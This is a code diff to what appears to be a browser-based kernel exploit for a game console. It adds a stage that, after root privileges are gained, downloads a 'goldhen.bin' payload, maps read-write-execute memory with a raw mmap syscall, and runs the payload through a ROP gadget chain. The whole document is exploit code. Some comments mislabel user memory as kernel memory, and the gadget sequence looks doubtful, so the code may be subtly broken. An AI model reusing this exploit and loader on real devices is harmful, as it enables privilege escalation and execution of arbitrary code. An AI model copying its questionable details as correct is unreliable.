@@ -1598,7 +1598,50 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    alert("kernel exploit succeeded!");
+	 try {
+        log('Loading GoldHEN payload...');
+        const req = new XMLHttpRequest();
+        req.responseType = "arraybuffer";
+        req.open('GET', 'goldhen.bin', false); // Sync per mantenere il contesto
+        req.send();
+        
+        if (req.status === 200) {
+            const PLD = req.response;
+            // Alloca memoria kernel protetta
+            const payload_buffer = chain.syscall(
+                477, // sys_mmap
+                0,
+                PLD.byteLength,
+                7, // PROT_READ | PROT_WRITE | PROT_EXEC
+                0x1002, // MAP_ANONYMOUS | MAP_PRIVATE
+                -1,
+                0
+            );
+            
+            // Copia il payload in memoria kernel
+            const pl = new Uint8Array(PLD);
+            mem.copy(payload_buffer, pl);
+            
+            // Esegui in contesto kernel
+            const pthread = spawn_thread(new Chain()
+                .push_gadget('mov rdi, rsp')
+                .push_gadget('sub rsp, 0x30')
+                .push_value(payload_buffer)
+                .push_gadget('call qword ptr [rdi]')
+                .push_gadget('add rsp, 0x30')
+                .push_gadget('ret')
+            );
+            
+            call_nze('pthread_join', pthread, 0);
+            alert("GOLDHEN PAYLOAD EXECUTED!");
+        } else {
+            alert("ERROR LOADING PAYLOAD!");
+        }
+    } catch (e) {
+        die(`Payload error: ${e.message}`);
+    }
+	
+  //  alert("kernel exploit succeeded!");
 }
 
 // FUNCTIONS FOR STAGE: SETUP
